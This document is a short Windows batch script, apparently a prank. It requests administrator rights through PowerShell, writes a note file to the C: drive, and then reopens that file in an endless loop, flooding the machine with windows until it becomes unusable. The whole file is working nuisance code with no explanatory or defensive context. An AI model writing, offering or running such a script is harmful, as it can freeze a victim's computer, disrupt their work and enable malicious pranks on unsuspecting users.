@echo off
powershell "start cmd -verb runas"
cd C:\
echo anything you want to write here >note.txt
:start
START C:\note.txt
goto START
